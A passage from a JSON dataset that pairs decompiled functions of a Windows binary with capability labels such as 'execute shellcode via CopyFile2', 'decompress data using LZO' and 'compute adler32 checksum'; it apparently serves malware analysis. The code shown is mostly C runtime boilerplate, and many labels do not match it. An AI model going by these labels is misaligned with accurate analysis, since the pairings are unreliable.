pcVar9,  pcVar9 < pcVar6)) {\n            do {\n                if (*pcVar8 == '\\n') {\n                    var_4h = var_4h + 1;\n                }\n                pcVar8 = pcVar8 + 1;\n            } while (pcVar8 < *arg_8h);\n        }\n        if (iVar11 == 0) {\n            uVar3 = ZEXT48(var_4h);\n        }\n        else {\n            if (((*(arg_8h + 3) & 1) != 0) && (arg_8h[1] != NULL)) {\n                pcVar6 = arg_8h[1] + (pcVar6 - pcVar9);\n                piVar1 = (pcVar7 >> 5) * 4 + 0x4430a0;\n                iVar10 = (pcVar7 & 0x1f) * 0x24;\n                if ((*(iVar10 + 4 + *piVar1) & 0x80) != 0) {\n                    iVar12 = fcn.004173bf(pcVar7, 0, 0, 2);\n                    if (iVar12 == iVar11) {\n                        pcVar7 = arg_8h[2];\n                        pcVar9 = pcVar6 + pcVar7;\n                        arg_8h = pcVar6;\n                        for (; pcVar7 < pcVar9; pcVar7 = pcVar7 + 1) {\n                            if (*pcVar7 == '\\n') {\n                                arg_8h = arg_8h + 1;\n                            }\n                        }\n                        uVar2 = *(ppcVar4 + 0xd) & 0x20;\n                    }\n                    else {\n                        fcn.004173bf(pcVar7, arg_ch, arg_10h, 0);\n                        pcVar7 = 0x200;\n                        if (((0x200 < pcVar6) || ((arg_8h[3] & 8) == 0)) || ((arg_8h[3] & 0x400) != 0)) {\n                            pcVar7 = arg_8h[6];\n                        }\n                        uVar2 = *(iVar10 + 4 + *piVar1) & 4;\n                        arg_8h = pcVar7;\n                    }\n                    pcVar6 = arg_8h;\n                    if (uVar2 != 0) {\n                        pcVar6 = arg_8h + 1;\n                    }\n                }\n                arg_8h = pcVar6;\n                iVar11 = CONCAT44(arg_10h - (arg_ch < arg_8h), arg_ch + -arg_8h);\n            }\n            uVar3 = iVar11 - 8;\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 1104
    },
    "00412a65": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00412a65(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    uint32_t arg_8h_00;\n    uint uVar2;\n    uint *puVar3;\n    int32_t unaff_EBP;\n    int32_t iVar4;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.0040f0bc(0x43bf68, 0xc);\n    arg_8h_00 = *(unaff_EBP + 8);\n    if (arg_8h_00 < *0x443060) {\n        piVar1 = (arg_8h_00 >> 5) * 4 + 0x4430a0;\n        iVar4 = (arg_8h_00 & 0x1f) * 0x24;\n        if ((*(*piVar1 + 4 + iVar4) & 1) != 0) {\n            fcn.004175b9(arg_8h_00);\n            *(unaff_EBP + -4) = 0;\n            if ((*(*piVar1 + 4 + iVar4) & 1) == 0) {\n                puVar3 = fcn.0041296c();\n                *puVar3 = 9;\n                puVar3 = fcn.00412975();\n                *puVar3 = 0;\n                *(unaff_EBP + -0x1c) = 0xffffffff;\n            }\n            else {\n                uVar2 = fcn.004129f1(arg_8h_00, *(unaff_EBP + 0xc), *(unaff_EBP + 0x10));\n                *(unaff_EBP + -0x1c) = uVar2;\n            }\n            *(unaff_EBP + -4) = 0xffffffff;\n            fcn.00412aec();\n            goto code_r0x00412b0a;\n        }\n    }\n    puVar3 = fcn.0041296c();\n    *puVar3 = 9;\n    puVar3 = fcn.00412975();\n    *puVar3 = 0;\ncode_r0x00412b0a:\n    fcn.0040f0f7();\n    return;\n}\n",
        "token_count": 522
    },
    "00412e15": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00412e15(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    uint32_t arg_8h_00;\n    uint uVar2;\n    uint *puVar3;\n    int32_t unaff_EBP;\n    int32_t iVar4;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.0040f0bc(0x43bf98, 0xc);\n    arg_8h_00 = *(unaff_EBP + 8);\n    if (arg_8h_00 < *0x443060) {\n        piVar1 = (arg_8h_00 >> 5) * 4 + 0x4430a0;\n        iVar4 = (arg_8h_00 & 0x1f) * 0x24;\n        if ((*(*piVar1 + 4 + iVar4) & 1) != 0) {\n            fcn.004175b9(arg_8h_00);\n            *(unaff_EBP + -4) = 0;\n            if ((*(*piVar1 + 4 + iVar4) & 1) == 0) {\n                puVar3 = fcn.0041296c();\n                *puVar3 = 9;\n                *(unaff_EBP + -0x1c) = 0xffffffff;\n            }\n            else {\n                uVar2 = fcn.00412d92(arg_8h_00);\n                *(unaff_EBP + -0x1c) = uVar2;\n            }\n            *(unaff_EBP + -4) = 0xffffffff;\n            fcn.00412e8c();\n            goto code_r0x00412eaa;\n        }\n    }\n    puVar3 = fcn.0041296c();\n    *puVar3 = 9;\n    puVar3 = fcn.00412975();\n    *puVar3 = 0;\ncode_r0x00412eaa:\n    fcn.0040f0f7();\n    return;\n}\n",
        "token_count": 470
    },
    "00416f71": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t fcn.00416f71(void)\n\n{\n    uint32_t uVar1;\n    uint16_t uVar2;\n    uint16_t unaff_BX;\n    \n    uVar1 = 0;\n    if ((unaff_BX & 1) != 0) {\n        uVar1 = 0x10;\n    }\n    if ((unaff_BX & 4) != 0) {\n        uVar1 = uVar1 | 8;\n    }\n    if ((unaff_BX & 8) != 0) {\n        uVar1 = uVar1 | 4;\n    }\n    if ((unaff_BX & 0x10) != 0) {\n        uVar1 = uVar1 | 2;\n    }\n    if ((unaff_BX & 0x20) != 0) {\n        uVar1 = uVar1 | 1;\n    }\n    if ((unaff_BX & 2) != 0) {\n        uVar1 = uVar1 | 0x80000;\n    }\n    uVar2 = unaff_BX & 0xc00;\n    if ((unaff_BX & 0xc00) != 0) {\n        if (uVar2 == 0x400) {\n            uVar1 = uVar1 | 0x100;\n        }\n        else if (uVar2 == 0x800) {\n            uVar1 = uVar1 | 0x200;\n        }\n        else if (uVar2 == 0xc00) {\n            uVar1 = uVar1 | 0x300;\n        }\n    }\n    if ((unaff_BX & 0x300) == 0) {\n        uVar1 = uVar1 | 0x20000;\n    }\n    else if ((unaff_BX & 0x300) == 0x200) {\n        uVar1 = uVar1 | 0x10000;\n    }\n    if ((unaff_BX & 0x1000) != 0) {\n        uVar1 = uVar1 | 0x40000;\n    }\n    return uVar1;\n}\n",
        "token_count": 473
    },
    "004173bf": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.004173bf(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t *piVar1;\n    uint32_t arg_8h_00;\n    uint *puVar2;\n    int32_t unaff_EBP;\n    int32_t iVar3;\n    ulong uVar4;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.0040f0bc(0x43d078, 0x10);\n    arg_8h_00 = *(unaff_EBP + 8);\n    if (arg_8h_00 < *0x443060) {\n        piVar1 = (arg_8h_00 >> 5) * 4 + 0x4430a0;\n        iVar3 = (arg_8h_00 & 0x1f) * 0x24;\n        if ((*(*piVar1 + 4 + iVar3) & 1) != 0) {\n            fcn.004175b9(arg_8h_00);\n            *(unaff_EBP + -4) = 0;\n            if ((*(*piVar1 + 4 + iVar3) & 1) == 0) {\n                puVar2 = fcn.0041296c();\n                *puVar2 = 9;\n                puVar2 = fcn.00412975();\n                *puVar2 = 0;\n                *(unaff_EBP + -0x20) = 0xffffffff;\n                *(unaff_EBP + -0x1c) = 0xffffffff;\n            }\n            else {\n                uVar4 = fcn.0041733c(arg_8h_00, *(unaff_EBP + 0xc), *(unaff_EBP + 0x10), *(unaff_EBP + 0x14));\n                *(unaff_EBP + -0x20) = uVar4;\n                *(unaff_EBP + -0x1c) = uVar4 >> 0x20;\n            }\n            *(unaff_EBP + -4) = 0xffffffff;\n            fcn.00417457();\n            goto code_r0x00417477;\n        }\n    }\n    puVar2 = fcn.0041296c();\n    *puVar2 = 9;\n    puVar2 = fcn.00412975();\n    *puVar2 = 0;\ncode_r0x00417477:\n    fcn.0040f0f7();\n    return;\n}\n",
        "token_count": 581
    },
    "00417578": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint fcn.00417578(uint32_t param_1)\n\n{\n    uint *puVar1;\n    \n    if ((param_1 < *0x443060) &&\n       (puVar1 = *((param_1 >> 5) * 4 + 0x4430a0) + (param_1 & 0x1f) * 0x24,  (*(puVar1 + 1) & 1) != 0)) {\n        return *puVar1;\n    }\n    puVar1 = fcn.0041296c();\n    *puVar1 = 9;\n    puVar1 = fcn.00412975();\n    *puVar1 = 0;\n    return 0xffffffff;\n}\n",
        "token_count": 159
    },
    "00417a99": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00417a99(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    uint32_t arg_8h_00;\n    uint uVar2;\n    uint *puVar3;\n    int32_t unaff_EBP;\n    int32_t iVar4;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.0040f0bc(0x43d0c0, 0xc);\n    arg_8h_00 = *(unaff_EBP + 8);\n    if (arg_8h_00 < *0x443060) {\n        piVar1 = (arg_8h_00 >> 5) * 4 + 0x4430a0;\n        iVar4 = (arg_8h_00 & 0x1f) * 0x24;\n        if ((*(*piVar1 + 4 + iVar4) & 1) != 0) {\n            fcn.004175b9(arg_8h_00);\n            *(unaff_EBP + -4) = 0;\n            if ((*(*piVar1 + 4 + iVar4) & 1) == 0) {\n                puVar3 = fcn.0041296c();\n                *puVar3 = 9;\n                puVar3 = fcn.00412975();\n                *puVar3 = 0;\n                *(unaff_EBP + -0x1c) = 0xffffffff;\n            }\n            else {\n                uVar2 = fcn.004178be(arg_8h_00, *(unaff_EBP + 0xc), *(unaff_EBP + 0x10));\n                *(unaff_EBP + -0x1c) = uVar2;\n            }\n            *(unaff_EBP + -4) = 0xffffffff;\n            fcn.00417b20();\n            goto code_r0x00417b3e;\n        }\n    }\n    puVar3 = fcn.0041296c();\n    *puVar3 = 9;\n    puVar3 = fcn.00412975();\n    *puVar3 = 0;\ncode_r0x00417b3e:\n    fcn.0040f0f7();\n    return;\n}\n",
        "token_count": 524
    },
    "0040a50c": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040a50c(int32_t *param_1)\n\n{\n    int32_t *arg_ch;\n    \n    if (param_1[0x14] != 0) {\n        if (param_1[0x15] < 0x10) {\n            arg_ch = param_1 + 0x10;\n        }\n        else {\n            arg_ch = param_1[0x10];\n        }\n        fcn.0040e4c4(0, arg_ch);\n    }\n    fcn.00401168(1, 0);\n    fcn.00401168(1, 0);\n    fcn.00401168(1, 0);\n    fcn.00401168(1, 0);\n    fcn.0040a8b0(*param_1 * 0x18 + 0x4427d8);\n    return;\n}\n",
        "token_count": 198
    },
    "00413e47": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nuint32_t fcn.00413e47(void)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    uint32_t uVar11;\n    uint32_t uVar12;\n    uint32_t uVar13;\n    uint32_t uVar14;\n    uint32_t uVar15;\n    uint32_t uVar16;\n    uint32_t uVar17;\n    uint32_t uVar18;\n    uint32_t uVar19;\n    uint32_t uVar20;\n    uint32_t uVar21;\n    uint32_t uVar22;\n    uint32_t uVar23;\n    uint32_t uVar24;\n    uint32_t uVar25;\n    uint32_t uVar26;\n    uint32_t uVar27;\n    uint32_t uVar28;\n    uint32_t uVar29;\n    uint32_t uVar30;\n    uint32_t uVar31;\n    uint32_t uVar32;\n    uint32_t uVar33;\n    uint32_t uVar34;\n    uint32_t uVar35;\n    uint32_t uVar36;\n    uint32_t uVar37;\n    uint32_t uVar38;\n    uint32_t uVar39;\n    uint32_t uVar40;\n    uint32_t uVar41;\n    uint32_t uVar42;\n    uint32_t uVar43;\n    uint32_t uVar44;\n    uint32_t arg_ch;\n    int32_t unaff_ESI;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = *0x442c2a;\n    arg_ch = *0x442c2c;\n    if (unaff_ESI == 0) {\n        return 0xffffffff;\n    }\n    uVar2 = fcn.004158aa(1, uVar1, 0x31, unaff_ESI + 4);\n    uVar3 = fcn.004158aa(1, uVar1, 0x32, unaff_ESI + 8);\n    uVar4 = fcn.004158aa(1, uVar1, 0x33, unaff_ESI + 0xc);\n    uVar5 = fcn.004158aa(1, uVar1, 0x34, unaff_ESI + 0x10);\n    uVar6 = fcn.004158aa(1, uVar1, 0x35, unaff_ESI + 0x14);\n    uVar7 = fcn.004158aa(1, uVar1, 0x36, unaff_ESI + 0x18);\n    uVar8 = fcn.004158aa(1, uVar1, 0x37, unaff_ESI);\n    uVar9 = fcn.004158aa(1, uVar1, 0x2a, unaff_ESI + 0x20);\n    uVar10 = fcn.004158aa(1, uVar1, 0x2b, unaff_ESI + 0x24);\n    uVar11 = fcn.004158aa(1, uVar1, 0x2c, unaff_ESI + 0x28);\n    uVar12 = fcn.004158aa(1, uVar1, 0x2d, unaff_ESI + 0x2c);\n    uVar13 = fcn.004158aa(1, uVar1, 0x2e, unaff_ESI + 0x30);\n    uVar14 = fcn.004158aa(1, uVar1, 0x2f, unaff_ESI + 0x34);\n    uVar15 = fcn.004158aa(1, uVar1, 0x30, unaff_ESI + 0x1c);\n    uVar16 = fcn.004158aa(1, uVar1, 0x44, unaff_ESI + 0x38);\n    uVar17 = fcn.004158aa(1, uVar1, 0x45, unaff_ESI + 0x3c);\n    uVar18 = fcn.004158aa(1, uVar1, 0x46, unaff_ESI + 0x40);\n    uVar19 = fcn.004158aa(1, uVar1, 0x47, unaff_ESI + 0x44);\n    uVar20 = fcn.004158aa(1, uVar1, 0x48, unaff_ESI + 0x48);\n    uVar21 = fcn.004158aa(1, uVar1, 0x49, unaff_ESI + 0x4c);\n    uVar22 = fcn.004158aa(1, uVar1, 0x4a, unaff_ESI + 0x50);\n    uVar23 = fcn.004158aa(1, uVar1, 0x4b, unaff_ESI + 0x54);\n    uVar24 = fcn.004158aa(1, uVar1, 0x4c, unaff_ESI + 0x58);\n    uVar25 = fcn.004158aa(1, uVar1, 0x4d, unaff_ESI + 0x5c);\n    uVar26 = fcn.004158aa(1, uVar1, 0x4e, unaff_ESI + 0x60);\n    uVar27 = fcn.004158aa(1, uVar1, 0x4f, unaff_ESI + 100);\n    uVar28 = fcn.004158aa(1, uVar1, 0x38, unaff_ESI + 0x68);\n    uVar29 = fcn.004158aa(1, uVar1, 0x39, unaff_ESI + 0x6c);\n    uVar30 = fcn.004158aa(1, uVar1, 0x3a, unaff_ESI + 0x70);\n    uVar31 = fcn.004158aa(1, uVar1, 0x3b, unaff_ESI + 0x74);\n    uVar32 = fcn.004158aa(1, uVar1, 0x3c, unaff_ESI + 0x78);\n    uVar33 = fcn.004158aa(1, uVar1, 0x3d, unaff_ESI + 0x7c);\n    uVar34 = fcn.004158aa(1, uVar1, 0x3e, unaff_ESI + 0x80);\n    uVar35 = fcn.004158aa(1, uVar1, 0x3f, unaff_ESI + 0x84);\n    uVar36 = fcn.004158aa(1, uVar1, 0x40, unaff_ESI + 0x88);\n    uVar37 = fcn.004158aa(1, uVar1, 0x41, unaff_ESI + 0x8c);\n    uVar38 = fcn.004158aa(1, uVar1, 0x42, unaff_ESI + 0x90);\n    uVar39 = fcn.004158aa(1, uVar1, 0x43, unaff_ESI + 0x94);\n    uVar40 = fcn.004158aa(1, uVar1, 0x28, unaff_ESI + 0x98);\n    uVar1 = fcn.004158aa(1, uVar1, 0x29, unaff_ESI + 0x9c);\n    uVar41 = fcn.004158aa(1, arg_ch, 0x1f, unaff_ESI + 0xa0);\n    uVar42 = fcn.004158aa(1, arg_ch, 0x20, unaff_ESI + 0xa4);\n    uVar43 = fcn.004158aa(1, arg_ch, 0x1003, unaff_ESI + 0xa8);\n    uVar44 = fcn.004158aa(0, arg_ch, 0x1009, unaff_ESI + 0xb0);\n    *(unaff_ESI + 0xac) = arg_ch;\n    return uVar2 | uVar3 | uVar4 | uVar5 | uVar6 | uVar7 | uVar8 | uVar9 | uVar10 | uVar11 | uVar12 | uVar13 | uVar14 |\n           uVar15 | uVar16 | uVar17 | uVar18 | uVar19 | uVar20 | uVar21 | uVar22 | uVar23 | uVar24 | uVar25 | uVar26 |\n           uVar27 | uVar28 | uVar29 | uVar30 | uVar31 | uVar32 | uVar33 | uVar34 | uVar35 | uVar36 | uVar37 | uVar38 |\n           uVar39 | uVar40 | uVar1 | uVar41 | uVar42 | uVar43 | uVar44;\n}\n",
        "token_count": 2105
    },
    "00411286": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Possible PIC construction at 0x00411318: Changing call to branch\n// WARNING: Removing unreachable block (ram,0x0041131d)\n// WARNING: Removing unreachable block (ram,0x00411343)\n// WARNING: Removing unreachable block (ram,0x00411322)\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00411286(uint uExitCode, uint arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    int32_t unaff_EBP;\n    uint var_4h;\n    \n    fcn.0040f0bc(0x43b950, 8);\n    fcn.0040f088(8);\n    *(unaff_EBP + -4) = 0;\n    if (*0x442aa0 == 1) {\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(*(unaff_EBP + 8));\n        (*_sym.imp.KERNEL32.dll_TerminateProcess)(uVar1);\n    }\n    *0x442a9c = 1;\n    *0x442a98 = *(unaff_EBP + 0x10);\n    if (*(unaff_EBP + 0xc) == 0) {\n        if (*0x4431b4 != NULL) {\n            while( true ) {\n                *0x4431b0 = *0x4431b0 + -1;\n                if (*0x4431b0 < *0x4431b4) break;\n                if (**0x4431b0 != NULL) {\n                    (***0x4431b0)();\n                }\n            }\n        }\n        fcn.004111e6(0x440b58);\n    }\n    fcn.004111e6(0x440e64);\n    *(unaff_EBP + -4) = 0xffffffff;\n    if (*(unaff_EBP + 0x10) != 0) {\n        fcn.0040efbb(8);\n    }\n    return;\n}\n",
        "token_count": 451
    },
    "0041696e": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.0041696e(int32_t param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    \n    puVar3 = param_1 + (param_2 / 0x20) * 4;\n    iVar1 = fcn.0041885c(*puVar3, 1 << (0x1fU - param_2 % 0x20 & 0x1f), puVar3);\n    iVar2 = param_2 / 0x20 + -1;\n    if (-1 < iVar2) {\n        puVar3 = param_1 + iVar2 * 4;\n        do {\n            if (iVar1 == 0) {\n                return;\n            }\n            iVar1 = fcn.0041885c(*puVar3, 1, puVar3);\n            iVar2 = iVar2 + -1;\n            puVar3 = puVar3 + -1;\n        } while (-1 < iVar2);\n    }\n    return;\n}\n",
        "token_count": 232
    },
    "0040b179": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040b179(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    uint var_4h;\n    \n    uVar1 = fcn.0040ce9f(arg_8h, arg_ch, arg_10h, arg_14h, in_EAX, 0, 0, 0);\n    return uVar1;\n}\n",
        "token_count": 105
    },
    "0041261c": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_18h_2\n\nvoid __cdecl fcn.0041261c(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    char *pcVar4;\n    uint var_8h;\n    uint var_ch;\n    uint var_128h_2;\n    uint var_124h_2;\n    uint var_128h;\n    uint lpFilename;\n    uint var_18h_2;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint uStack4;\n    \n    uStack4 = 0x118;\n    var_18h = 0x43bf48;\n    fcn.0040f0bc();\n    *(unaff_EBP + -0x1c) = *0x441350;\n    pcVar1 = *0x442bb4;\n    if (*0x442bb4 == NULL) {\n        if (*(unaff_EBP + 8) == 1) {\n            pcVar4 = \"Buffer overrun detected!\";\n            *(unaff_EBP + -0x128) =\n                 \"A buffer overrun has been detected which has corrupted the program\\'s\\ninternal state.  The program cannot safely continue execution and must\\nnow be terminated.\\n\"\n            ;\n        }\n        else {\n            pcVar4 = \"Unknown security failure detected!\";\n            *(unaff_EBP + -0x128) =\n                 \"A security error of unknown cause has been detected which has\\ncorrupted the program\\'s internal state.  The program cannot safely\\ncontinue execution and must now be terminated.\\n\"\n            ;\n        }\n        *(unaff_EBP + -0x20) = 0;\n        iVar2 = (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)(0, unaff_EBP + -0x124, 0x104);\n        if (iVar2 == 0) {\n            fcn.00411ed0(unaff_EBP + -0x124, \"<program name unknown>\");\n        }\n        iVar2 = unaff_EBP + -0x124;\n        iVar3 = fcn.0040bc50(iVar2);\n        if (0x3c < iVar3 + 0xbU) {\n            iVar2 = fcn.0040bc50(iVar2);\n            iVar2 = iVar2 + unaff_EBP + -0x155;\n            fcn.004149a0(iVar2, 0x43bd48, 3);\n        }\n        fcn.0040bc50(iVar2);\n        fcn.0040fc80();\n        *(unaff_EBP + -0x18) = &var_18h;\n        fcn.00411ed0(&var_18h, pcVar4);\n        fcn.00411ee0(&var_18h, 0x43bd28);\n        fcn.00411ee0(&var_18h, \"Program: \");\n        fcn.00411ee0(&var_18h, iVar2);\n        fcn.00411ee0(&var_18h, 0x43bd28);\n        fcn.00411ee0(&var_18h, *(unaff_EBP + -0x128));\n        fcn.00417133(&var_18h, \"Microsoft Visual C++ Runtime Library\", 0x12010);\n    }\n    else {\n        *(unaff_EBP + -4) = 0;\n        (*pcVar1)(*(unaff_EBP + 8), *(unaff_EBP + 0xc));\n        *(unaff_EBP + -4) = 0xffffffff;\n    }\n    fcn.0041135a(3);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 906
    },
    "00416ae8": {
        "rules": [
            "compute adler32 checksum/59ba9d7991e641c88d7c729645f1cfca"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00416ae8(uint16_t *arg_8h, uint32_t *arg_ch, int32_t *arg_10h)\n\n{\n    uint16_t uVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uint var_18h;\n    uint32_t var_ch;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    uVar1 = arg_8h[5];\n    var_ch = *(arg_8h + 3);\n    var_8h = *(arg_8h + 1);\n    var_4h = *arg_8h << 0x10;\n    uVar5 = uVar1 & 0x7fff;\n    iVar6 = uVar5 - 0x3fff;\n    if (iVar6 == -0x3fff) {\n        iVar6 = 0;\n        uVar5 = fcn.00416a54();\n        uVar2 = uVar5;\n        if (uVar5 != 0) {\ncode_r0x00416c00:\n            uVar3 = 0;\n            goto code_r0x00416c02;\n        }\n    }\n    else {\n        fcn.00416a2d(&var_18h, &var_ch);\n        iVar4 = fcn.004169bb(&var_ch, arg_10h[2]);\n        if (iVar4 != 0) {\n            iVar6 = uVar5 - 0x3ffe;\n        }\n        iVar4 = arg_10h[1];\n        if (iVar6 < iVar4 - arg_10h[2]) {\n            var_ch = 0;\n            var_8h = 0;\n            uVar5 = var_ch;\n            uVar2 = var_8h;\n        }\n        else {\n            if (iVar4 < iVar6) {\n                if (*arg_10h <= iVar6) {\n                    var_8h = 0;\n                    var_4h = 0;\n                    var_ch = 0x80000000;\n                    fcn.00416a6d(&var_ch, arg_10h[3]);\n                    iVar6 = arg_10h[5] + *arg_10h;\n                    uVar3 = 1;\n                    goto code_r0x00416c02;\n                }\n                var_ch = var_ch & 0x7fffffff;\n                iVar6 = arg_10h[5] + iVar6;\n                fcn.00416a6d(&var_ch, arg_10h[3]);\n                goto code_r0x00416c00;\n            }\n            fcn.00416a2d(&var_ch, &var_18h);\n            fcn.00416a6d(&var_ch, iVar4 - iVar6);\n            fcn.004169bb(&var_ch, arg_10h[2]);\n            fcn.00416a6d(&var_ch, arg_10h[3] + 1);\n            uVar5 = var_ch;\n            uVar2 = var_8h;\n        }\n    }\n    var_8h = uVar2;\n    var_ch = uVar5;\n    iVar6 = 0;\n    uVar3 = 2;\ncode_r0x00416c02:\n    var_ch = iVar6 << (0x1fU - arg_10h[3] & 0x1f) | -((uVar1 & 0x8000) != 0) & 0x80000000 | var_ch;\n    if (arg_10h[4] == 0x40) {\n        arg_ch[1] = var_ch;\n        *arg_ch = var_8h;\n    }\n    else if (arg_10h[4] == 0x20) {\n        *arg_ch = var_ch;\n    }\n    return uVar3;\n}\n",
        "token_count": 866
    },
    "00416c6c": {
        "rules": [
            "compute adler32 checksum/59ba9d7991e641c88d7c729645f1cfca"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00416c6c(uint16_t *arg_8h, uint *arg_ch)\n\n{\n    uint16_t uVar1;\n    int32_t iVar2;\n    uint16_t uVar3;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_4h = 0;\n    uVar1 = arg_8h[5];\n    var_10h = *(arg_8h + 3);\n    var_ch = *(arg_8h + 1);\n    var_8h = *arg_8h << 0x10;\n    uVar3 = uVar1 & 0x7fff;\n    iVar2 = fcn.004169bb(&var_10h, 0x40);\n    if (iVar2 != 0) {\n        var_10h = 0x80000000;\n        uVar3 = uVar3 + 1;\n    }\n    if (uVar3 == 0x7fff) {\n        var_4h = 1;\n    }\n    arg_ch[1] = var_10h;\n    *(arg_ch + 2) = uVar1 & 0x8000 | uVar3;\n    *arg_ch = var_ch;\n    return var_4h;\n}\n",
        "token_count": 294
    },
    "00418936": {
        "rules": [
            "compute adler32 checksum/59ba9d7991e641c88d7c729645f1cfca"
        ],
